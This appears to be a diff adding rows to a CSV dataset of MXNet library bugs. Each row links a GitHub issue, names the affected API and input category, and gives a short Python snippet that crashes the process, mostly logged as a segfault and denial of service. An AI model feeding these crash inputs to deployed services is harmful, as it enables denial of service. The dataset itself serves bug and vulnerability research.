+MXNet,https://github.com/apache/incubator-mxnet/issues/20183,N.A,mxnet.ndarray,mxnet.ndarray.signsgd_update,Empty input,"import numpy as np
+import mxnet
+weight=mxnet.nd.ones((1,))
+grad=mxnet.nd.array(np.ones((0,)))
+mxnet.ndarray.signsgd_update(weight=weight, grad=grad, lr=0.9)",grad,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/20182,N.A,mxnet.contrib.ndarray,mxnet.contrib.ndarray.quadratic,Empty input,"import numpy as np
+import mxnet
+
+mxnet.contrib.ndarray.quadratic(data=mxnet.nd.array(np.ones((0,))), b=1, out=mxnet.nd.ones((1)))",data,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/20181,N.A,mxnet.ndarray,mxnet.ndarray.pick,Empty input,"import numpy as np
+import mxnet
+
+mxnet.ndarray.pick(data=mxnet.nd.ones((1,1)),index=mxnet.nd.array(np.ones((0,))))",index,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/20180,N.A,mxnet.ndarray,mxnet.ndarray.contrib.box_encode,Empty input,"import mxnet
+import numpy as np
+samples=mxnet.nd.ones((1,1))
+matches=mxnet.nd.ones((1,1))
+anchors=mxnet.nd.ones((1,1,4))
+refs=mxnet.nd.array(np.ones((1,0,4)))
+means=mxnet.nd.ones((4,))
+stds=mxnet.nd.ones((4,))
+mxnet.ndarray.contrib.box_encode(samples=samples, matches=matches, anchors=anchors, refs=refs, means=means, stds=stds)",refs,,,
+MXNet,https://github.com/apache/incubator-mxnet/issues/20079,N.A,mxnet.ndarray,mxnet.ndarray.histogram,Very large input argument,"import mxnet
+mxnet.ndarray.histogram(a=mxnet.nd.ones((1, 1, 1, 1)), range=(-2e+307, 1e+307))",range,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/20076,N.A,mxnet.ndarray,mxnet.ndarray.op.SequenceMask,Invalid argument,"import mxnet
+mxnet.ndarray.op.SequenceMask(data=mxnet.nd.ones((1,1)), sequence_length = mxnet.nd.array([1e+18]), use_sequence_length=True)",N.A,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/20076,N.A,mxnet.ndarray,mxnet.ndarray.op.SequenceReverse,Invalid argument,"mxnet.ndarray.op.SequenceReverse(data=mxnet.nd.ones((1,1)), sequence_length = mxnet.nd.array([1e+09]), use_sequence_length=True)",N.A,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/20076,N.A,mxnet.ndarray,mxnet.ndarray.SequenceLast,Invalid argument,"mxnet.ndarray.SequenceLast(data=mxnet.nd.ones((1,1)), sequence_length = mxnet.nd.array([1e+09]), use_sequence_length=True)",N.A,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/19941,N.A,mxnet.ndarray,mxnet.ndarray.take,Empty input,"import mxnet
+import numpy as np
+mxnet.ndarray.take(indices = mxnet.nd.array((3, 8, 19, 2)), a=mxnet.nd.array(np.ones((0))))",a,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/16051,N.A,mxnet.nd,mx.nd.softmax,float32 argument,"import mxnet as mx
+
+len = mx.nd.array([1,2]); 
+x = mx.nd.array([[1,2],[3,4]]); 
+mx.nd.softmax(data=x, length=len, use_length=True)",len,N.A,segfault,Denial of service
+MXNet,https://github.com/apache/incubator-mxnet/issues/13193,N.A,mxnet.nd,nd.sparse.elemwise_mul,Sparse tensor,"b = nd.array([[0, 1, 2, 3, 4, 0, 0]]).tostype('csr')
+a = nd.array([[1, 2, 3, 0, 0, 0, 0]]).tostype('csr')
+d = nd.sparse.elemwise_mul(a, b)",N.A,N.A,N.A,wrong result
